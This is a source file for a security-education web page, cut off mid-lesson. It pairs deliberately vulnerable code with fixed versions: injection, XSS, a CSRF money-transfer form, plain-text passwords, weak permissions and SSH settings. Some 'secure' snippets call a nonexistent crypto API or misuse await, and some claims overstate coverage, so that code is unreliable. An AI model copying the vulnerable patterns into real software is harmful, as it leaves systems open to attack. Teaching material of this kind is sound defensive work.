import { useState, useEffect, useRef, Suspense, lazy } from "react";
import { useParams } from "react-router-dom";
import { 
  BookOpen, Code, Shield, Target, ChevronRight, Play, 
  CheckCircle, XCircle, AlertTriangle, Info, Copy,
  Eye, EyeOff, Lightbulb, Zap, Lock, Unlock, Terminal, Server, Clock
} from "lucide-react";
import { CommandPalette } from "../components/CommandPalette";
import { Header } from "../components/Header";
import { AppSidebar } from "../components/AppSidebar";
import { LearnSidebar } from "../components/LearnSidebar";
import { LazyInteractiveContent } from "../components/LazyInteractiveContent";
import { SidebarInset } from "@/components/ui/sidebar";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Separator } from "@/components/ui/separator";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Skeleton } from "@/components/ui/skeleton";
import { useTheme } from "../hooks/useTheme";
import { useLanguage } from "../hooks/useLanguage";
import { useLearnProgressContext } from "../contexts/LearnProgressContext";
import { interactiveLessons } from "../data/interactiveContent";
import { useIntersectionObserver, usePerformance, useDebounce } from "../hooks/usePerformanceOptimization";
import { transitions, animations, animateProgress } from "../lib/animations";

// Lazy load heavy components
const QuizComponent = lazy(() => import('../components/QuizComponent').then(module => ({
  default: module.QuizComponent
})));

const CodeExerciseComponent = lazy(() => import('../components/CodeExerciseComponent').then(module => ({
  default: module.CodeExerciseComponent
})));

// Educational content structure
const learnContent = {
  fundamentals: {
    "owasp-top10": {
      title: "OWASP Top 10 Security Risks", // Nome técnico preservado
      descriptionKey: "learn.security_fundamentals_desc",
      progress: 0,
      totalLessons: 10,
      sections: [
        {
          id: "introduction",
          title: "Introduction to OWASP Top 10",
          type: "theory",
          content: {
            theory: `The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.`,
            keyPoints: [
              "Updated regularly based on real-world data",
              "Industry standard for web security",
              "Foundation for secure development practices",
              "Covers 90% of common web vulnerabilities"
            ]
          }
        },
        {
          id: "broken-access-control",
          title: "A01: Broken Access Control",
          type: "practical",
          content: {
            theory: `Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data.`,
            vulnerability: {
              code: `// VULNERABLE - No access control check
app.get('/user/:id/profile', (req, res) => {
    const userId = req.params.id;
    const profile = getUserProfile(userId);
    res.json(profile); // Anyone can access any user's profile
});`,
              explanation: "This endpoint allows any authenticated user to access any other user's profile by changing the ID in the URL."
            },
            secure: {
              code: `// SECURE - Proper access control
app.get('/user/:id/profile', authenticateToken, (req, res) => {
    const userId = req.params.id;
    const currentUser = req.user;
    
    // Check if user can access this profile
    if (userId !== currentUser.id && !currentUser.isAdmin) {
        return res.status(403).json({ error: 'Access denied' });
    }
    
    const profile = getUserProfile(userId);
    res.json(profile);
});`,
              explanation: "Proper access control checks ensure users can only access their own data or if they have appropriate permissions."
            },
            prevention: [
              "Implement proper authorization checks",
              "Use principle of least privilege",
              "Deny by default access control",
              "Log access control failures"
            ]
          }
        },
        {
          id: "injection",
          title: "A03: Injection Attacks",
          type: "practical",
          content: {
            theory: `Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. SQL, NoSQL, OS, and LDAP injection vulnerabilities can occur when hostile data tricks an interpreter into executing unintended commands.`,
            vulnerability: {
              code: `// VULNERABLE - SQL Injection
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
$result = mysql_query($query);

// VULNERABLE - Command Injection
$filename = $_GET['file'];
exec("cat /var/logs/" . $filename, $output);`,
              explanation: "Direct concatenation of user input allows attackers to inject malicious SQL commands or system commands."
            },
            secure: {
              code: `// SECURE - Parameterized queries
$query = "SELECT * FROM users WHERE id = ?";
$stmt = $pdo->prepare($query);
$stmt->execute([$_GET['id']]);

// SECURE - Input validation and whitelisting
$allowedFiles = ['access.log', 'error.log', 'debug.log'];
$filename = $_GET['file'];
if (in_array($filename, $allowedFiles)) {
    $output = file_get_contents("/var/logs/" . $filename);
}`,
              explanation: "Using prepared statements and input validation prevents injection attacks by separating code from data."
            },
            prevention: [
              "Use parameterized queries or prepared statements",
              "Validate and sanitize all input",
              "Use stored procedures when appropriate",
              "Implement least privilege database access"
            ]
          }
        },
        {
          id: "cryptographic-failures",
          title: "A02: Cryptographic Failures",
          type: "practical",
          content: {
            theory: `Many web applications and APIs do not properly protect sensitive data with encryption. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.`,
            vulnerability: {
              code: `// VULNERABLE - Weak encryption
const crypto = require('crypto');
const algorithm = 'des'; // Weak algorithm
const password = 'password123'; // Weak key

function encrypt(text) {
    const cipher = crypto.createCipher(algorithm, password);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

// VULNERABLE - Storing passwords in plain text
const users = {
    'admin': { password: 'admin123', role: 'administrator' }
};`,
              explanation: "Using weak encryption algorithms and storing passwords in plain text makes sensitive data vulnerable to attacks."
            },
            secure: {
              code: `// SECURE - Strong encryption
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const algorithm = 'aes-256-gcm';

function encrypt(text, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipherGCM(algorithm, key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    return { encrypted, iv: iv.toString('hex'), authTag: authTag.toString('hex') };
}

// SECURE - Proper password hashing
async function hashPassword(password) {
    const saltRounds = 12;
    return await bcrypt.hash(password, saltRounds);
}`,
              explanation: "Using strong encryption algorithms with proper key management and password hashing provides robust protection for sensitive data."
            },
            prevention: [
              "Use strong, up-to-date encryption algorithms",
              "Implement proper key management",
              "Hash passwords with strong algorithms (bcrypt, scrypt, Argon2)",
              "Use HTTPS for all sensitive communications"
            ]
          }
        }
      ]
    },
    "secure-coding": {
      title: "Secure Coding Principles", // Nome técnico preservado
      descriptionKey: "learn.secure_development",
      progress: 30,
      totalLessons: 8,
      sections: [
        {
          id: "input-validation",
          title: "Input Validation",
          type: "practical",
          content: {
            theory: "Never trust user input. All input must be validated on both client and server side. Input validation is the first line of defense against many attacks.",
            vulnerability: {
              code: `// VULNERABLE - No validation
function updateEmail(email) {
    document.getElementById('userEmail').innerHTML = email;
}

// VULNERABLE - Direct database query
function searchUser(username) {
    const query = "SELECT * FROM users WHERE username = '" + username + "'";
    return db.query(query);
}`,
              explanation: "Directly inserting user input into DOM can lead to XSS attacks, and unvalidated database queries are vulnerable to SQL injection."
            },
            secure: {
              code: `// SECURE - Proper validation and encoding
function updateEmail(email) {
    // Validate email format
    const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
    if (!emailRegex.test(email)) {
        throw new Error('Invalid email format');
    }
    
    // Safe DOM manipulation
    document.getElementById('userEmail').textContent = email;
}

// SECURE - Parameterized query with validation
function searchUser(username) {
    // Validate username format (alphanumeric and underscore only)
    if (!/^[a-zA-Z0-9_]+$/.test(username)) {
        throw new Error('Invalid username format');
    }
    
    const query = "SELECT * FROM users WHERE username = ?";
    return db.prepare(query).get(username);
}`,
              explanation: "Input validation combined with safe DOM manipulation and parameterized queries prevent XSS and SQL injection attacks."
            },
            prevention: [
              "Validate all input on both client and server side",
              "Use whitelist validation when possible",
              "Sanitize output based on context (HTML, URL, SQL)",
              "Implement proper error handling"
            ]
          }
        },
        {
          id: "authentication-security",
          title: "Secure Authentication",
          type: "practical",
          content: {
            theory: "Authentication is the process of verifying the identity of a user. Secure authentication requires proper password handling, session management, and protection against common attacks.",
            vulnerability: {
              code: `// VULNERABLE - Plain text passwords and weak session management
const users = {
    'admin': { password: 'admin123' },
    'user': { password: 'password' }
};

function login(username, password) {
    const user = users[username];
    if (user && user.password === password) {
        // Weak session - predictable session ID
        const sessionId = username + '_' + Date.now();
        sessions[sessionId] = { username: username };
        return sessionId;
    }
    return null;
}`,
              explanation: "Storing passwords in plain text and using predictable session IDs makes the system vulnerable to credential theft and session hijacking."
            },
            secure: {
              code: `// SECURE - Password hashing and secure session management
const bcrypt = require('bcrypt');
const crypto = require('crypto');

const users = {
    'admin': { 
        passwordHash: '$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewU6Q3z7BbZ9.xQy' 
    }
};

async function login(username, password) {
    const user = users[username];
    if (user && await bcrypt.compare(password, user.passwordHash)) {
        // Secure session - cryptographically random session ID
        const sessionId = crypto.randomBytes(32).toString('hex');
        sessions[sessionId] = { 
            username: username, 
            createdAt: Date.now(),
            expiresAt: Date.now() + (30 * 60 * 1000) // 30 minutes
        };
        return sessionId;
    }
    return null;
}

async function hashPassword(password) {
    const saltRounds = 12;
    return await bcrypt.hash(password, saltRounds);
}`,
              explanation: "Using bcrypt for password hashing and cryptographically secure session IDs provides robust authentication security."
            },
            prevention: [
              "Hash passwords with strong algorithms (bcrypt, scrypt, Argon2)",
              "Use cryptographically secure session IDs",
              "Implement session timeout and proper logout",
              "Add brute force protection and account lockout"
            ]
          }
        },
        {
          id: "authorization-controls",
          title: "Authorization and Access Control",
          type: "practical",
          content: {
            theory: "Authorization determines what an authenticated user is allowed to do. Proper access control ensures users can only access resources they are permitted to use.",
            vulnerability: {
              code: `// VULNERABLE - No access control checks
app.get('/admin/users', (req, res) => {
    // Anyone with a valid session can access admin functions
    const users = getAllUsers();
    res.json(users);
});

app.delete('/user/:id', (req, res) => {
    // Any user can delete any other user
    deleteUser(req.params.id);
    res.json({ success: true });
});`,
              explanation: "Missing authorization checks allow any authenticated user to access admin functions and modify other users' data."
            },
            secure: {
              code: `// SECURE - Proper role-based access control
function requireRole(role) {
    return (req, res, next) => {
        if (!req.user || req.user.role !== role) {
            return res.status(403).json({ error: 'Access denied' });
        }
        next();
    };
}

function requireOwnershipOrAdmin(req, res, next) {
    const targetUserId = req.params.id;
    if (req.user.id !== targetUserId && req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Access denied' });
    }
    next();
}

app.get('/admin/users', authenticateToken, requireRole('admin'), (req, res) => {
    const users = getAllUsers();
    res.json(users);
});

app.delete('/user/:id', authenticateToken, requireOwnershipOrAdmin, (req, res) => {
    deleteUser(req.params.id);
    res.json({ success: true });
});`,
              explanation: "Role-based access control and ownership checks ensure users can only perform actions they are authorized for."
            },
            prevention: [
              "Implement role-based access control (RBAC)",
              "Follow principle of least privilege",
              "Validate authorization on every request",
              "Use centralized authorization logic"
            ]
          }
        }
      ]
    },
    "cryptography": {
      title: "Cryptography Fundamentals",
      description: "Essential cryptographic concepts for secure applications",
      progress: 0,
      totalLessons: 8,
      sections: [
        {
          id: "symmetric-encryption",
          title: "Symmetric Encryption Basics",
          type: "practical",
          content: {
            theory: "Symmetric encryption uses the same key for both encryption and decryption. It's fast and efficient for large amounts of data.",
            vulnerability: {
              code: `// VULNERABLE - Weak encryption
const crypto = require('crypto');
const algorithm = 'des'; // Weak algorithm
const key = '12345678'; // Weak key
const cipher = crypto.createCipher(algorithm, key);
let encrypted = cipher.update(data, 'utf8', 'hex');
encrypted += cipher.final('hex');`,
              explanation: "Using weak algorithms like DES and simple keys makes encryption vulnerable to attacks."
            },
            secure: {
              code: `// SECURE - Strong encryption
const crypto = require('crypto');
const algorithm = 'aes-256-gcm';
const key = crypto.randomBytes(32); // Strong random key
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipherGCM(algorithm, key, iv);
let encrypted = cipher.update(data, 'utf8', 'hex');
encrypted += cipher.final('hex');
const authTag = cipher.getAuthTag();`,
              explanation: "Using AES-256-GCM with strong random keys provides robust encryption with authentication."
            },
            prevention: [
              "Use modern, strong algorithms (AES-256)",
              "Generate cryptographically secure random keys",
              "Implement proper key management",
              "Use authenticated encryption modes"
            ]
          }
        }
      ]
    },
    "threat-modeling": {
      title: "Threat Modeling", // Nome técnico preservado
      descriptionKey: "learn.security_fundamentals_desc",
      progress: 0,
      totalLessons: 6,
      sections: [
        {
          id: "introduction-threat-modeling",
          title: "Introduction to Threat Modeling",
          type: "theory",
          content: {
            theory: "Threat modeling is a structured approach to identifying, quantifying, and addressing security risks. It helps organizations understand their attack surface and prioritize security measures.",
            keyPoints: [
              "Systematic approach to security analysis",
              "Identifies potential threats early in development",
              "Helps prioritize security investments",
              "Enables proactive rather than reactive security"
            ]
          }
        },
        {
          id: "stride-methodology",
          title: "STRIDE Methodology",
          type: "practical",
          content: {
            theory: "STRIDE is a threat modeling methodology that categorizes threats into six types: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege.",
            vulnerability: {
              code: `// VULNERABLE - No threat consideration in design
class UserService {
    login(username, password) {
        // No consideration for spoofing attacks
        if (users[username] && users[username].password === password) {
            return { success: true, token: username + '_' + Date.now() };
        }
        return { success: false };
    }
    
    updateProfile(token, userData) {
        // No consideration for tampering or elevation of privilege
        const user = this.getUserByToken(token);
        Object.assign(user, userData);
        return user;
    }
}`,
              explanation: "This code doesn't consider STRIDE threats like spoofing (weak authentication), tampering (no data integrity), or elevation of privilege (unrestricted profile updates)."
            },
            secure: {
              code: `// SECURE - STRIDE-aware design
class SecureUserService {
    constructor() {
        this.loginAttempts = new Map(); // DoS protection
    }
    
    async login(username, password, clientInfo) {
        // Spoofing protection - strong authentication
        if (this.isRateLimited(username)) {
            throw new Error('Too many attempts'); // DoS protection
        }
        
        const user = await this.getUserByUsername(username);
        if (user && await bcrypt.compare(password, user.passwordHash)) {
            // Generate secure, non-repudiable token
            const token = jwt.sign(
                { userId: user.id, role: user.role }, 
                process.env.JWT_SECRET,
                { expiresIn: '1h' }
            );
            
            // Audit logging for non-repudiation
            this.logSecurityEvent('LOGIN_SUCCESS', { username, clientInfo });
            return { success: true, token };
        }
        
        this.recordFailedAttempt(username);
        this.logSecurityEvent('LOGIN_FAILED', { username, clientInfo });
        return { success: false };
    }
    
    updateProfile(token, userData) {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        
        // Elevation of privilege protection
        if (userData.role && decoded.role !== 'admin') {
            throw new Error('Insufficient privileges');
        }
        
        // Tampering protection - validate and sanitize
        const allowedFields = ['name', 'email', 'phone'];
        const sanitizedData = this.sanitizeUserData(userData, allowedFields);
        
        // Information disclosure protection
        const updatedUser = await this.updateUser(decoded.userId, sanitizedData);
        return this.sanitizeUserResponse(updatedUser);
    }
}`,
              explanation: "This secure implementation addresses all STRIDE threats with proper authentication, authorization, data validation, audit logging, and rate limiting."
            },
            prevention: [
              "Apply STRIDE analysis to all system components",
              "Implement controls for each identified threat type",
              "Document threat model and security decisions",
              "Regular threat model reviews and updates"
            ]
          }
        },
        {
          id: "attack-trees",
          title: "Attack Trees and Risk Assessment",
          type: "practical",
          content: {
            theory: "Attack trees are a structured way to analyze potential attack paths against a system. They help visualize how an attacker might achieve their goals and estimate the likelihood and impact of different attacks.",
            keyPoints: [
              "Visual representation of attack scenarios",
              "Helps identify critical security controls",
              "Supports risk-based security decisions",
              "Can be quantified with probability and cost data"
            ]
          }
        }
      ]
    },
    "authentication": {
      title: "Authentication Mechanisms",
      description: "Understanding various authentication methods and their security implications",
      progress: 0,
      totalLessons: 10,
      sections: [
        {
          id: "password-security",
          title: "Secure Password Handling",
          type: "practical",
          content: {
            theory: "Password security involves proper hashing, salting, and storage mechanisms to protect user credentials.",
            vulnerability: {
              code: `// VULNERABLE - Plain text storage
const users = [
    { username: 'admin', password: 'password123' },
    { username: 'user', password: 'mypassword' }
];
function login(username, password) {
    const user = users.find(u => u.username === username);
    return user && user.password === password;
}`,
              explanation: "Storing passwords in plain text exposes all user credentials if the database is compromised."
            },
            secure: {
              code: `// SECURE - Proper password hashing
const bcrypt = require('bcrypt');
const saltRounds = 12;

async function hashPassword(password) {
    return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
}

// Storage: only hashed passwords
const users = [
    { username: 'admin', passwordHash: '$2b$12$...' }
];`,
              explanation: "Using bcrypt with proper salt rounds ensures passwords are securely hashed and cannot be easily reversed."
            },
            prevention: [
              "Never store passwords in plain text",
              "Use strong hashing algorithms (bcrypt, scrypt, Argon2)",
              "Implement proper salt generation",
              "Enforce strong password policies"
            ]
          }
        }
      ]
    },
    "authorization": {
      title: "Authorization and Access Control",
      description: "Implementing proper access control and authorization mechanisms",
      progress: 0,
      totalLessons: 9,
      sections: [
        {
          id: "rbac-implementation",
          title: "Role-Based Access Control (RBAC)",
          type: "practical",
          content: {
            theory: "RBAC assigns permissions to roles rather than individual users, simplifying access management and following the principle of least privilege.",
            vulnerability: {
              code: `// VULNERABLE - Direct permission checks
function deleteUser(currentUser, targetUserId) {
    // No proper authorization check
    if (currentUser.id !== targetUserId) {
        return database.deleteUser(targetUserId);
    }
    throw new Error('Cannot delete yourself');
}`,
              explanation: "Missing proper role-based authorization allows unauthorized access to sensitive operations."
            },
            secure: {
              code: `// SECURE - RBAC implementation
const roles = {
    ADMIN: ['create', 'read', 'update', 'delete'],
    MODERATOR: ['read', 'update'],
    USER: ['read']
};

function hasPermission(user, action) {
    return roles[user.role]?.includes(action) || false;
}

function deleteUser(currentUser, targetUserId) {
    if (!hasPermission(currentUser, 'delete')) {
        throw new Error('Insufficient permissions');
    }
    return database.deleteUser(targetUserId);
}`,
              explanation: "Proper RBAC implementation ensures users can only perform actions their role permits."
            },
            prevention: [
              "Implement role-based access control",
              "Follow principle of least privilege",
              "Regularly audit user permissions",
              "Use centralized authorization logic"
            ]
          }
        }
      ]
    }
  },
  "web-security": {
    "injection-attacks": {
      title: "Injection Attacks", // Nome técnico preservado
      descriptionKey: "learn.understanding",
      progress: 60,
      totalLessons: 12,
      sections: [
        {
          id: "sql-injection-fundamentals",
          title: "SQL Injection Fundamentals",
          type: "practical",
          content: {
            theory: "SQL Injection occurs when user input is directly incorporated into SQL queries without proper sanitization, allowing attackers to manipulate database queries.",
            vulnerability: {
              code: `// VULNERABLE - Classic SQL Injection
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '" . $id . "'";
$result = mysqli_query($connection, $query);

// VULNERABLE - Second-order SQL Injection
function updateProfile($userId, $bio) {
    // First query - data stored
    $stmt = $pdo->prepare("UPDATE users SET bio = ? WHERE id = ?");
    $stmt->execute([$bio, $userId]);
    
    // Second query - vulnerable when bio is used
    $query = "SELECT * FROM posts WHERE author_bio = '" . $bio . "'";
    return $pdo->query($query)->fetchAll();
}`,
              explanation: "Direct string concatenation and unescaped stored data allow attackers to manipulate SQL queries and potentially access or modify unauthorized data."
            },
            secure: {
              code: `// SECURE - Parameterized queries
$id = $_GET['id'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();

// SECURE - Proper escaping for stored data
function updateProfile($userId, $bio) {
    // Store data safely
    $stmt = $pdo->prepare("UPDATE users SET bio = ? WHERE id = ?");
    $stmt->execute([$bio, $userId]);
    
    // Use parameterized query for retrieval
    $stmt = $pdo->prepare("SELECT * FROM posts WHERE author_bio = ?");
    $stmt->execute([$bio]);
    return $stmt->fetchAll();
}`,
              explanation: "Prepared statements with parameter binding separate SQL code from data, preventing injection attacks even with malicious input."
            },
            prevention: [
              "Always use prepared statements with parameter binding",
              "Validate and sanitize all user input",
              "Implement principle of least privilege for database accounts",
              "Use stored procedures with proper parameter handling",
              "Regular security code reviews and testing"
            ]
          }
        },
        {
          id: "xss-prevention",
          title: "Cross-Site Scripting (XSS) Prevention",
          type: "practical",
          content: {
            theory: "XSS attacks inject malicious scripts into web pages viewed by other users. There are three main types: Reflected, Stored, and DOM-based XSS.",
            vulnerability: {
              code: `// VULNERABLE - Reflected XSS
app.get('/search', (req, res) => {
    const query = req.query.q;
    res.send('<h1>Search Results for: ' + query + '</h1>');
});

// VULNERABLE - Stored XSS
app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    // Store comment directly without sanitization
    db.saveComment(comment);
    res.redirect('/comments');
});

// Display comments
app.get('/comments', (req, res) => {
    const comments = db.getComments();
    let html = '<div>';
    comments.forEach(comment => {
        html += '<p>' + comment.text + '</p>'; // Dangerous!
    });
    html += '</div>';
    res.send(html);
});`,
              explanation: "Directly outputting user input to HTML without proper encoding allows attackers to inject malicious JavaScript that executes in victims' browsers."
            },
            secure: {
              code: `// SECURE - Proper XSS prevention
const DOMPurify = require('isomorphic-dompurify');
const validator = require('validator');

app.get('/search', (req, res) => {
    const query = validator.escape(req.query.q || '');
    res.send('<h1>Search Results for: ' + query + '</h1>');
});

// SECURE - Input sanitization and output encoding
app.post('/comment', (req, res) => {
    let comment = req.body.comment;
    
    // Sanitize HTML while allowing safe tags
    comment = DOMPurify.sanitize(comment, {
        ALLOWED_TAGS: ['b', 'i', 'u', 'p'],
        ALLOWED_ATTR: []
    });
    
    db.saveComment(comment);
    res.redirect('/comments');
});

// SECURE - Template engine with auto-escaping
app.get('/comments', (req, res) => {
    const comments = db.getComments();
    res.render('comments', { comments }); // Template auto-escapes
});`,
              explanation: "Proper input validation, HTML sanitization, and template engines with auto-escaping prevent XSS attacks while maintaining functionality."
            },
            prevention: [
              "Use template engines with automatic HTML escaping",
              "Implement Content Security Policy (CSP)",
              "Validate and sanitize all user input",
              "Use HTTP-only cookies for sensitive data",
              "Regular security testing and code review"
            ]
          }
        },
        {
          id: "command-injection-prevention",
          title: "Command Injection Prevention",
          type: "practical",
          content: {
            theory: "Command injection occurs when applications execute system commands constructed using unvalidated user input, allowing attackers to execute arbitrary commands.",
            vulnerability: {
              code: `// VULNERABLE - Direct command execution
app.post('/ping', (req, res) => {
    const host = req.body.host;
    const exec = require('child_process').exec;
    
    // Dangerous - user input directly in command
    exec('ping -c 4 ' + host, (error, stdout, stderr) => {
        res.send({ output: stdout, error: stderr });
    });
});

// VULNERABLE - File operations
app.get('/log', (req, res) => {
    const filename = req.query.file;
    const fs = require('fs');
    
    // Path traversal vulnerability
    const content = fs.readFileSync('/var/logs/' + filename, 'utf8');
    res.send(content);
});`,
              explanation: "Directly incorporating user input into system commands allows attackers to inject additional commands or access unauthorized files."
            },
            secure: {
              code: `// SECURE - Input validation and safe execution
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

app.post('/ping', (req, res) => {
    const host = req.body.host;
    
    // Validate input - only allow valid hostnames/IPs
    const hostRegex = /^[a-zA-Z0-9.-]+$/;
    if (!hostRegex.test(host) || host.length > 253) {
        return res.status(400).json({ error: 'Invalid hostname' });
    }
    
    // Use spawn with array of arguments (safer)
    const ping = spawn('ping', ['-c', '4', host]);
    let output = '';
    
    ping.stdout.on('data', (data) => {
        output += data.toString();
    });
    
    ping.on('close', (code) => {
        res.json({ output, exitCode: code });
    });
});

// SECURE - Path validation and whitelisting
app.get('/log', (req, res) => {
    const filename = req.query.file;
    const allowedFiles = ['access.log', 'error.log', 'debug.log'];
    
    if (!allowedFiles.includes(filename)) {
        return res.status(400).json({ error: 'File not allowed' });
    }
    
    const safePath = path.join('/var/logs/', filename);
    
    // Additional check to prevent path traversal
    if (!safePath.startsWith('/var/logs/')) {
        return res.status(400).json({ error: 'Invalid path' });
    }
    
    try {
        const content = fs.readFileSync(safePath, 'utf8');
        res.send(content);
    } catch (error) {
        res.status(404).json({ error: 'File not found' });
    }
});`,
              explanation: "Input validation, whitelisting, and using secure APIs (spawn vs exec) prevent command injection while maintaining legitimate functionality."
            },
            prevention: [
              "Avoid executing system commands when possible",
              "Use parameterized APIs instead of shell commands",
              "Validate and whitelist all user input",
              "Run applications with minimal privileges",
              "Implement proper error handling"
            ]
          }
        }
      ]
    },
    "authentication-security": {
      title: "Authentication Security", // Nome técnico preservado
      descriptionKey: "learn.web_security_desc",
      progress: 0,
      totalLessons: 8,
      sections: [
        {
          id: "secure-authentication-implementation",
          title: "Secure Authentication Implementation",
          type: "practical",
          content: {
            theory: "Authentication security involves properly verifying user identity while protecting against common attacks like brute force, credential stuffing, and session hijacking."
          }
        }
      ]
    },
    "session-management": {
      title: "Session Management", // Nome técnico preservado  
      descriptionKey: "learn.web_security_desc",
      progress: 0,
      totalLessons: 7,
      sections: [
        {
          id: "secure-session-implementation",
          title: "Secure Session Implementation", 
          type: "practical",
          content: {
            theory: "Session management controls how user sessions are created, maintained, and destroyed. Poor session management can lead to session hijacking, fixation, and unauthorized access."
          }
        }
      ]
    },
    "csrf-attacks": {
      title: "Cross-Site Request Forgery (CSRF)",
      description: "Understanding and preventing CSRF attacks in web applications",
      progress: 0,
      totalLessons: 6,
      sections: [
        {
          id: "csrf-fundamentals",
          title: "CSRF Attack Fundamentals",
          type: "practical",
          content: {
            theory: "CSRF attacks trick authenticated users into performing unwanted actions on web applications where they're authenticated.",
            vulnerability: {
              code: `<!-- VULNERABLE - No CSRF protection -->
<form action="/transfer-money" method="POST">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="1000">
    <input type="submit" value="Click for free gift!">
</form>

// Server-side (no CSRF token validation)
app.post('/transfer-money', (req, res) => {
    const { to, amount } = req.body;
    transferMoney(req.user.id, to, amount);
    res.redirect('/success');
});`,
              explanation: "Without CSRF protection, malicious sites can trigger authenticated actions on behalf of users."
            },
            secure: {
              code: `<!-- SECURE - With CSRF token -->
<form action="/transfer-money" method="POST">
    <input type="hidden" name="_token" value="<%= csrfToken %>">
    <input type="text" name="to" required>
    <input type="number" name="amount" required>
    <input type="submit" value="Transfer">
</form>

// Server-side with CSRF protection
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.post('/transfer-money', csrfProtection, (req, res) => {
    const { to, amount } = req.body;
    transferMoney(req.user.id, to, amount);
    res.redirect('/success');
});`,
              explanation: "CSRF tokens ensure requests originate from legitimate forms, preventing cross-site request forgery."
            },
            prevention: [
              "Implement CSRF tokens for state-changing operations",
              "Use SameSite cookie attributes",
              "Validate origin and referer headers",
              "Require re-authentication for sensitive actions"
            ]
          }
        }
      ]
    }
  },
  "os-security": {
    "linux-security": {
      title: "Linux Security Fundamentals",
      description: "Essential security practices for Linux systems",
      progress: 0,
      totalLessons: 25,
      sections: [
        {
          id: "file-permissions",
          title: "File Permissions and Access Control",
          type: "practical",
          content: {
            theory: "Linux file permissions are fundamental to system security, controlling who can read, write, or execute files.",
            vulnerability: {
              code: `# VULNERABLE - Overly permissive permissions
chmod 777 /etc/passwd
chmod 755 /home/user/.ssh/private_key`,
              explanation: "Setting overly permissive permissions can expose sensitive files to unauthorized access."
            },
            secure: {
              code: `# SECURE - Proper permission settings
chmod 644 /etc/passwd
chmod 600 /home/user/.ssh/private_key
chown root:root /etc/passwd`,
              explanation: "Restrictive permissions ensure only authorized users can access sensitive files."
            },
            prevention: [
              "Follow principle of least privilege",
              "Regularly audit file permissions",
              "Use proper ownership settings",
              "Implement access control lists (ACLs) when needed"
            ]
          }
        },
        {
          id: "user-management",
          title: "User and Group Management",
          type: "practical",
          content: {
            theory: "Proper user and group management is essential for maintaining system security and controlling access to resources.",
            vulnerability: {
              code: `# VULNERABLE - Weak user management
useradd -m -s /bin/bash newuser
passwd newuser  # Setting weak password
usermod -aG sudo newuser  # Giving unnecessary sudo access
chmod 755 /home/newuser  # Overly permissive home directory`,
              explanation: "Poor user management practices can lead to privilege escalation and unauthorized access."
            },
            secure: {
              code: `# SECURE - Proper user management
useradd -m -s /bin/bash -G users newuser
passwd -e newuser  # Force password change on first login
# Set strong password policy in /etc/login.defs
usermod -L newuser  # Lock account until properly configured
chmod 700 /home/newuser  # Restrictive home directory
chage -M 90 -W 14 newuser  # Password expires in 90 days with 14-day warning`,
              explanation: "Secure user management includes proper permissions, password policies, and account restrictions."
            },
            prevention: [
              "Enforce strong password policies",
              "Use principle of least privilege for group membership",
              "Implement account lockout policies",
              "Regular audit of user accounts and permissions"
            ]
          }
        },
        {
          id: "ssh-hardening",
          title: "SSH Server Hardening",
          type: "practical",
          content: {
            theory: "SSH is a critical service that requires proper hardening to prevent unauthorized access and attacks.",
            vulnerability: {
              code: `# VULNERABLE - Default SSH configuration
# /etc/ssh/sshd_config
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
X11Forwarding yes
MaxAuthTries 6`,
              explanation: "Default SSH configurations expose the system to brute force attacks and unauthorized access."
            },
            secure: {
              code: `# SECURE - Hardened SSH configuration
# /etc/ssh/sshd_config
Port 2222
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
PermitEmptyPasswords no
X11Forwarding no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
AllowUsers admin developer
DenyUsers guest nobody`,
              explanation: "Hardened SSH configuration reduces attack vectors and implements security best practices."
            },
            prevention: [
              "Use non-standard ports",
              "Implement key-based authentication",
              "Restrict user access with AllowUsers/DenyUsers",
              "Configure connection timeouts and limits"
            ]
          }
        },
        {
          id: "log-monitoring",
          title: "System Log Monitoring and Analysis",
          type: "practical",
          content: {
            theory: "System logs provide crucial information for detecting security incidents and system anomalies.",
            vulnerability: {
              code: `# VULNERABLE - No log monitoring
# Default log rotation without analysis
# /etc/logrotate.conf
/var/log/*.log {
    daily
    rotate 7
    compress
}
# No alerting on security events`,
              explanation: "Without proper log monitoring, security incidents can go undetected for extended periods."
            },
            secure: {
              code: `# SECURE - Comprehensive log monitoring
# Install and configure rsyslog with remote logging
# /etc/rsyslog.conf
*.* @@logserver.company.com:514

# Configure fail2ban for intrusion detection
# /etc/fail2ban/jail.local
[sshd]
enabled = true
port = 2222
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600

# Set up log analysis with auditd
auditctl -w /etc/passwd -p wa -k passwd_changes
